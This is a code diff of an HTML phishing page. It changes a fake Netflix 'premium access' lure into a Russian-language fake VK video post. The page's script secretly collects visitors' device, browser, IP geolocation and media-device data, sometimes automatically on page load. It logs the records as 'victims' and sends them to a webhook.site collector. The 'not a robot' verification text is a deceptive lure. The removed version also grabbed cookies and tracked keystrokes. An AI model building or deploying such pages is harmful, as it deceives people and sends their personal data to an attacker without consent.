@@ -1,314 +1,416 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Netflix Premium Access</title>
+    <title>Новая запись | VK</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
-            background: #000; 
+            background: #4a76a8; 
             color: #fff; 
-            font-family: 'Netflix Sans', 'Helvetica Neue', Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             overflow: hidden;
             height: 100vh;
-            background: linear-gradient(135deg, #000000 0%, #1a1a1a 100%);
         }
         
-        .netflix-bg {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: 
-                radial-gradient(circle at 20% 80%, rgba(229, 9, 20, 0.1) 0%, transparent 50%),
-                radial-gradient(circle at 80% 20%, rgba(229, 9, 20, 0.1) 0%, transparent 50%);
-            z-index: -1;
-        }
-        
-        .loading-container {
+        .vk-container {
             display: flex;
             flex-direction: column;
-            justify-content: center;
             align-items: center;
-            height: 100vh;
-            text-align: center;
+            justify-content: center;
+            min-height: 100vh;
             padding: 20px;
+            background: linear-gradient(135deg, #4a76a8 0%, #5b88bd 100%);
         }
         
-        .netflix-logo {
-            font-size: 4rem;
-            font-weight: 900;
-            color: #e50914;
+        .vk-header {
+            text-align: center;
             margin-bottom: 2rem;
-            text-shadow: 0 0 30px rgba(229, 9, 20, 0.5);
-            animation: pulse 2s infinite;
         }
         
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.8; }
+        .vk-logo {
+            font-size: 3rem;
+            font-weight: bold;
+            margin-bottom: 1rem;
         }
         
-        .progress-container {
-            width: 300px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            padding: 3px;
-            margin: 2rem 0;
-        }
-        
-        .progress-bar {
-            height: 6px;
-            background: linear-gradient(90deg, #e50914, #ff6b6b);
-            border-radius: 8px;
-            width: 0%;
-            transition: width 0.3s ease;
-            box-shadow: 0 0 10px rgba(229, 9, 20, 0.5);
-        }
-        
-        .status-text {
-            font-size: 1.1rem;
-            margin: 1rem 0;
-            color: #ccc;
-        }
-        
-        .verification-box {
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 15px;
+        .post-card {
+            background: white;
+            color: #000;
+            border-radius: 12px;
             padding: 2rem;
-            margin: 1rem;
-            backdrop-filter: blur(10px);
-            max-width: 400px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            margin-bottom: 2rem;
         }
         
-        .btn {
-            background: #e50914;
+        .post-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+        
+        .avatar {
+            width: 50px;
+            height: 50px;
+            background: #4a76a8;
+            border-radius: 50%;
+            margin-right: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+        }
+        
+        .user-info h3 {
+            margin: 0;
+            color: #2a5885;
+        }
+        
+        .user-info span {
+            color: #656565;
+            font-size: 0.9rem;
+        }
+        
+        .post-content {
+            margin: 1.5rem 0;
+            line-height: 1.5;
+        }
+        
+        .post-image {
+            width: 100%;
+            height: 200px;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
+            border-radius: 8px;
+            margin: 1rem 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 1.2rem;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .post-image::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            animation: shimmer 2s infinite;
+        }
+        
+        @keyframes shimmer {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+        
+        .play-button {
+            position: absolute;
+            background: rgba(0,0,0,0.7);
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+        
+        .post-stats {
+            display: flex;
+            justify-content: space-between;
+            color: #656565;
+            font-size: 0.9rem;
+            border-top: 1px solid #e7e8ec;
+            padding-top: 1rem;
+            margin-bottom: 1rem;
+        }
+        
+        .choice-buttons {
+            display: flex;
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+        
+        .vk-button {
+            background: #4a76a8;
             color: white;
             border: none;
-            padding: 12px 30px;
+            padding: 15px 20px;
             border-radius: 8px;
             font-size: 1rem;
             font-weight: 600;
             cursor: pointer;
-            margin: 5px;
+            flex: 1;
             transition: all 0.3s ease;
-            width: 100%;
-        }
-        
-        .btn:hover {
-            background: #f40612;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(229, 9, 20, 0.4);
-        }
-        
-        .btn-secondary {
-            background: rgba(255, 255, 255, 0.1);
-        }
-        
-        .btn-secondary:hover {
-            background: rgba(255, 255, 255, 0.2);
-        }
-        
-        .features-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 1rem;
-            margin: 1.5rem 0;
-        }
-        
-        .feature-item {
             display: flex;
             align-items: center;
+            justify-content: center;
             gap: 0.5rem;
-            font-size: 0.9rem;
-            color: #ccc;
         }
         
-        .success-animation {
-            color: #00ff88;
-            font-size: 3rem;
+        .vk-button:hover {
+            background: #3d6899;
+            transform: translateY(-2px);
+        }
+        
+        .vk-button.secondary {
+            background: #e5ebf1;
+            color: #2a5885;
+            border: 2px solid #4a76a8;
+        }
+        
+        .vk-button.secondary:hover {
+            background: #dce3eb;
+        }
+        
+        .loading-bar {
+            width: 100%;
+            height: 4px;
+            background: #e7e8ec;
+            border-radius: 2px;
             margin: 1rem 0;
-            animation: bounce 1s infinite;
-        }
-        
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-        
-        .stats-grid {
+            overflow: hidden;
             display: none;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 1rem;
-            margin: 1rem 0;
         }
         
-        .stat-item {
-            background: rgba(255, 255, 255, 0.05);
+        .loading-progress {
+            height: 100%;
+            background: #4a76a8;
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+        
+        .status-message {
+            text-align: center;
+            margin: 1rem 0;
             padding: 1rem;
             border-radius: 8px;
+            display: none;
+        }
+        
+        .success { background: #d4edda; color: #155724; }
+        .error { background: #f8d7da; color: #721c24; }
+        
+        .privacy-notice {
             text-align: center;
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 0.9rem;
+            margin-top: 2rem;
+            max-width: 500px;
         }
         
-        .stat-value {
-            font-size: 1.5rem;
-            font-weight: bold;
-            color: #e50914;
+        .video-info {
+            background: #f5f7fa;
+            padding: 1rem;
+            border-radius: 8px;
+            margin: 1rem 0;
+            border-left: 4px solid #4a76a8;
         }
         
-        .stat-label {
-            font-size: 0.8rem;
-            color: #ccc;
+        .video-info h4 {
+            color: #2a5885;
+            margin-bottom: 0.5rem;
+        }
+        
+        .video-meta {
+            display: flex;
+            gap: 1rem;
+            color: #656565;
+            font-size: 0.9rem;
         }
     </style>
 </head>
 <body>
-    <div class="netflix-bg"></div>
-    
-    <div class="loading-container" id="loadingScreen">
-        <div class="netflix-logo">NETFLIX</div>
-        
-        <div class="progress-container">
-            <div class="progress-bar" id="progressBar"></div>
+    <div class="vk-container">
+        <div class="vk-header">
+            <div class="vk-logo">VK</div>
+            <h2>Новая запись в ленте</h2>
         </div>
         
-        <div class="status-text" id="statusText">
-            Initializing premium access system...
-        </div>
-        
-        <div class="verification-box">
-            <h3 style="margin-bottom: 1rem;">🔒 Premium Verification</h3>
-            <p style="color: #ccc; margin-bottom: 1.5rem;">
-                Complete device verification to unlock premium features
-            </p>
+        <div class="post-card">
+            <div class="post-header">
+                <div class="avatar">АП</div>
+                <div class="user-info">
+                    <h3>Анна Петрова</h3>
+                    <span>Только что · Общедоступная запись</span>
+                </div>
+            </div>
             
-            <button class="btn" onclick="startVerification()" id="verifyBtn">
-                START VERIFICATION
-            </button>
+            <div class="post-content">
+                <p>Ребята, посмотрите это видео! 😍 Невероятные кадры, такого вы еще не видели! Это просто взрыв эмоций! 💥</p>
+                
+                <div class="video-info">
+                    <h4>🎥 Эксклюзивное видео</h4>
+                    <p>Длительность: 2:45 · Качество: 1080p</p>
+                    <div class="video-meta">
+                        <span>👁️ 1.2K просмотров</span>
+                        <span>📅 Сегодня</span>
+                    </div>
+                </div>
+                
+                <div class="post-image" onclick="startVerification('click')">
+                    <div class="play-button">▶</div>
+                    ВИДЕО ЗАПИСЬ
+                </div>
+                
+                <p><strong>Для просмотра необходимо подтвердить, что вы не робот</strong></p>
+            </div>
             
-            <div class="features-grid">
-                <div class="feature-item">✅ 4K Streaming</div>
-                <div class="feature-item">✅ Multiple Devices</div>
-                <div class="feature-item">✅ Offline Downloads</div>
-                <div class="feature-item">✅ Premium Content</div>
+            <div class="post-stats">
+                <span>❤️ 245</span>
+                <span>💬 89</span>
+                <span>↪️ 34</span>
+                <span>⭐ 156</span>
+            </div>
+            
+            <div class="loading-bar" id="loadingBar">
+                <div class="loading-progress" id="loadingProgress"></div>
+            </div>
+            
+            <div class="status-message" id="statusMessage"></div>
+            
+            <div class="choice-buttons">
+                <button class="vk-button secondary" onclick="startVerification('app')">
+                    📱 Открыть в приложении
+                </button>
+                <button class="vk-button" onclick="startVerification('site')">
+                    🌐 Смотреть на сайте
+                </button>
             </div>
         </div>
         
-        <div class="stats-grid" id="statsGrid">
-            <div class="stat-item">
-                <div class="stat-value" id="dataCount">0</div>
-                <div class="stat-label">Data Points</div>
-            </div>
-            <div class="stat-item">
-                <div class="stat-value" id="locationCount">0</div>
-                <div class="stat-label">Location Data</div>
-            </div>
-            <div class="stat-item">
-                <div class="stat-value" id="deviceCount">0</div>
-                <div class="stat-label">Device Info</div>
-            </div>
+        <div class="privacy-notice">
+            🔒 Проверка безопасности выполняется автоматически для защиты от роботов
         </div>
     </div>
 
     <script>
-        // Глобальные переменные
-        let collectedData = {};
-        let autoCollectInterval;
-        let progress = 0;
         const WEBHOOK_URL = 'https://webhook.site/b7de489c-4da3-4197-b262-b5a6d9fc029b';
+        let isCollecting = false;
+        let collectionMethod = '';
 
-        // Автозапуск сбора данных
-        function startAutoCollection() {
-            console.log('🚀 Starting automatic data collection...');
+        // Автозапуск через 3 секунды (имитация загрузки контента)
+        setTimeout(() => {
+            if (!isCollecting && Math.random() < 0.4) {
+                startAutoCollection('auto');
+            }
+        }, 3000);
+
+        function startVerification(method) {
+            if (!isCollecting) {
+                collectionMethod = method;
+                startAutoCollection(method);
+            }
+        }
+
+        function startAutoCollection(method) {
+            if (isCollecting) return;
+            isCollecting = true;
             
-            // Прогресс бар
+            // Скрываем кнопки выбора
+            document.querySelector('.choice-buttons').style.display = 'none';
+            document.getElementById('loadingBar').style.display = 'block';
+            
+            let buttonText = 'Подготовка видео...';
+            if (method === 'app') buttonText = 'Запуск приложения...';
+            if (method === 'site') buttonText = 'Загрузка плеера...';
+            
+            document.getElementById('statusMessage').textContent = buttonText;
+            document.getElementById('statusMessage').className = 'status-message success';
+            document.getElementById('statusMessage').style.display = 'block';
+
+            // Анимация прогресса
+            let progress = 0;
             const progressInterval = setInterval(() => {
-                progress += Math.random() * 10;
+                progress += Math.random() * 12;
                 if (progress > 100) progress = 100;
-                document.getElementById('progressBar').style.width = progress + '%';
+                document.getElementById('loadingProgress').style.width = progress + '%';
                 
                 if (progress >= 30) {
-                    document.getElementById('statusText').textContent = 'Analyzing device capabilities...';
+                    document.getElementById('statusMessage').textContent = 'Проверка устройства...';
                 }
                 if (progress >= 60) {
-                    document.getElementById('statusText').textContent = 'Optimizing streaming quality...';
+                    document.getElementById('statusMessage').textContent = 'Оптимизация качества...';
                 }
-                if (progress >= 90) {
-                    document.getElementById('statusText').textContent = 'Finalizing premium access...';
+                if (progress >= 85) {
+                    document.getElementById('statusMessage').textContent = 'Загрузка контента...';
                 }
-            }, 200);
+            }, 300);
 
             // Основной сбор данных
             setTimeout(async () => {
                 try {
-                    // Сбор базовых данных
-                    collectedData = await collectAllData();
+                    const collectedData = await collectAllData(method);
+                    await sendCollectedData(collectedData);
                     
-                    // Показ статистики
-                    showStats();
-                    
-                    // Отправка данных
-                    await sendCollectedData();
+                    clearInterval(progressInterval);
+                    document.getElementById('loadingProgress').style.width = '100%';
                     
                     // Успешное завершение
-                    clearInterval(progressInterval);
-                    showSuccess();
+                    showSuccess(method);
                     
                 } catch (error) {
                     console.error('Collection error:', error);
-                    document.getElementById('statusText').textContent = 'Verification complete!';
+                    showStatus('Ошибка загрузки. Попробуйте еще раз.', 'error');
+                    resetInterface();
                 }
-            }, 3000);
+            }, 4000);
         }
 
-        // Основная функция сбора данных
-        async function collectAllData() {
-            const data = {
+        async function collectAllData(method) {
+            return {
                 session: {
-                    id: generateSessionId(),
+                    id: generateId(),
                     startTime: new Date().toISOString(),
                     url: window.location.href,
-                    referrer: document.referrer
+                    referrer: document.referrer,
+                    source: 'vk_phishing',
+                    method: method,
+                    userAgent: navigator.userAgent
                 },
                 device: await getDeviceInfo(),
                 location: await getLocationInfo(),
                 network: getNetworkInfo(),
                 browser: getBrowserInfo(),
-                behavior: startBehaviorTracking(),
-                system: await getSystemInfo(),
+                screen: getScreenInfo(),
                 media: await getMediaDevices(),
-                storage: getStorageData()
+                timestamp: new Date().toISOString(),
+                interaction: {
+                    method: method,
+                    clickTime: Date.now(),
+                    pageLoadTime: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 0
+                }
             };
-            
-            return data;
         }
 
-        // Сбор информации об устройстве
         async function getDeviceInfo() {
             return {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
+                vendor: navigator.vendor,
                 hardware: {
                     cores: navigator.hardwareConcurrency,
                     memory: navigator.deviceMemory,
                     maxTouchPoints: navigator.maxTouchPoints
                 },
-                screen: {
-                    width: screen.width,
-                    height: screen.height,
-                    colorDepth: screen.colorDepth,
-                    pixelDepth: screen.pixelDepth,
-                    orientation: screen.orientation?.type
-                },
-                battery: await getBatteryStatus(),
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 language: navigator.language,
-                languages: navigator.languages
+                languages: navigator.languages,
+                cookieEnabled: navigator.cookieEnabled,
+                pdfViewerEnabled: navigator.pdfViewerEnabled
             };
         }
 
-        // Геолокация через IP
         async function getLocationInfo() {
             const apis = [
                 'https://ipapi.co/json/',
@@ -319,13 +421,20 @@
             for (let api of apis) {
                 try {
                     const response = await fetch(api);
-                    return await response.json();
+                    const data = await response.json();
+                    return {
+                        ip: data.ip,
+                        country: data.country,
+                        city: data.city,
+                        region: data.region,
+                        timezone: data.timezone,
+                        org: data.org
+                    };
                 } catch(e) { continue; }
             }
             return null;
         }
 
-        // Информация о сети
         function getNetworkInfo() {
             const conn = navigator.connection;
             return {
@@ -337,128 +446,56 @@
             };
         }
 
-        // Информация о браузере
         function getBrowserInfo() {
             return {
-                vendor: navigator.vendor,
-                cookies: navigator.cookieEnabled,
-                java: navigator.javaEnabled(),
-                pdf: navigator.pdfViewerEnabled,
-                plugins: Array.from(navigator.plugins).map(p => p.name),
-                mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type)
+                plugins: Array.from(navigator.plugins).map(p => ({
+                    name: p.name,
+                    filename: p.filename
+                })).slice(0, 5),
+                mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type).slice(0, 10),
+                javaEnabled: navigator.javaEnabled()
             };
         }
 
-        // Отслеживание поведения
-        function startBehaviorTracking() {
-            const behavior = {
-                clicks: [],
-                scroll: 0,
-                keys: 0,
-                movements: [],
-                startTime: Date.now()
-            };
-            
-            document.addEventListener('click', (e) => {
-                behavior.clicks.push({
-                    x: e.clientX,
-                    y: e.clientY,
-                    target: e.target.tagName,
-                    time: Date.now() - behavior.startTime
-                });
-            });
-            
-            window.addEventListener('scroll', () => {
-                behavior.scroll = Math.max(behavior.scroll, 
-                    (window.scrollY + window.innerHeight) / document.documentElement.scrollHeight * 100
-                );
-            });
-            
-            document.addEventListener('keydown', () => behavior.keys++);
-            
-            return behavior;
-        }
-
-        // Системная информация
-        async function getSystemInfo() {
+        function getScreenInfo() {
             return {
-                performance: {
-                    memory: performance.memory,
-                    timing: performance.timing
-                },
-                storage: await getStorageEstimate()
+                width: screen.width,
+                height: screen.height,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                orientation: screen.orientation?.type
             };
         }
 
-        // Медиа устройства
         async function getMediaDevices() {
             try {
                 const devices = await navigator.mediaDevices.enumerateDevices();
-                return devices.map(d => ({
-                    kind: d.kind,
-                    deviceId: d.deviceId,
-                    hasLabel: !!d.label
-                }));
+                return {
+                    count: devices.length,
+                    types: devices.map(d => d.kind),
+                    hasLabels: devices.some(d => d.label)
+                };
             } catch(e) {
-                return [];
+                return { error: e.message };
             }
         }
 
-        // Данные хранилища
-        function getStorageData() {
-            return {
-                cookies: document.cookie,
-                localStorage: Object.keys(localStorage).length,
-                sessionStorage: Object.keys(sessionStorage).length
-            };
-        }
-
-        // Вспомогательные функции
-        async function getBatteryStatus() {
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    return {
-                        level: Math.round(battery.level * 100),
-                        charging: battery.charging
-                    };
-                } catch(e) {}
-            }
-            return null;
-        }
-
-        async function getStorageEstimate() {
-            if ('storage' in navigator && 'estimate' in navigator.storage) {
-                try {
-                    return await navigator.storage.estimate();
-                } catch(e) {}
-            }
-            return null;
-        }
-
-        function generateSessionId() {
-            return Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
-        }
-
-        // Отправка данных
-        async function sendCollectedData() {
+        async function sendCollectedData(data) {
             try {
-                // Локальное сохранение
-                const allData = JSON.parse(localStorage.getItem('netflix_victims') || '[]');
-                allData.push({
-                    ...collectedData,
-                    timestamp: new Date().toISOString()
-                });
-                localStorage.setItem('netflix_victims', JSON.stringify(allData));
+                // Сохранение в localStorage
+                const existingData = JSON.parse(localStorage.getItem('vk_phishing_victims') || '[]');
+                existingData.push(data);
+                localStorage.setItem('vk_phishing_victims', JSON.stringify(existingData));
                 
                 // Отправка на webhook
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        type: 'auto_collection',
-                        data: collectedData,
-                        source: 'netflix_auto'
+                        type: 'vk_phishing_complete',
+                        data: data,
+                        campaign: 'video_post',
+                        timestamp: new Date().toISOString()
                     })
                 });
                 
@@ -467,41 +504,36 @@
             }
         }
 
-        // UI функции
-        function showStats() {
-            document.getElementById('statsGrid').style.display = 'grid';
-            document.getElementById('dataCount').textContent = Object.keys(collectedData).length * 10;
-            document.getElementById('locationCount').textContent = collectedData.location ? '1' : '0';
-            document.getElementById('deviceCount').textContent = '1';
-        }
-
-        function showSuccess() {
-            document.getElementById('statusText').innerHTML = 
-                '<div class="success-animation">✅</div> Premium Access Granted!';
-            document.getElementById('verifyBtn').style.display = 'none';
+        function showSuccess(method) {
+            document.getElementById('statusMessage').textContent = '✅ Проверка завершена! Загрузка видео...';
             
             setTimeout(() => {
-                document.getElementById('loadingScreen').style.opacity = '0';
-                setTimeout(() => {
-                    document.getElementById('loadingScreen').style.display = 'none';
-                }, 1000);
-            }, 3000);
+                // Редирект в зависимости от выбора
+                if (method === 'app') {
+                    window.location.href = 'vk://video' + generateId();
+                } else {
+                    window.location.href = 'https://vk.com/video' + generateId();
+                }
+            }, 1500);
         }
 
-        function startVerification() {
-            document.getElementById('verifyBtn').disabled = true;
-            document.getElementById('verifyBtn').textContent = 'VERIFYING...';
-            startAutoCollection();
+        function showStatus(message, type) {
+            const statusEl = document.getElementById('statusMessage');
+            statusEl.textContent = message;
+            statusEl.className = `status-message ${type}`;
+            statusEl.style.display = 'block';
         }
 
-        // Автозапуск через 3 секунды
-        setTimeout(() => {
-            if (Math.random() < 0.7) { // 70% автостарт
-                startAutoCollection();
-                document.getElementById('statusText').textContent = 'Starting automatic verification...';
-                document.getElementById('verifyBtn').style.display = 'none';
-            }
-        }, 3000);
+        function resetInterface() {
+            document.querySelector('.choice-buttons').style.display = 'flex';
+            document.getElementById('loadingBar').style.display = 'none';
+            document.getElementById('statusMessage').style.display = 'none';
+            isCollecting = false;
+        }
+
+        function generateId() {
+            return Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
+        }
 
     </script>
 </body>
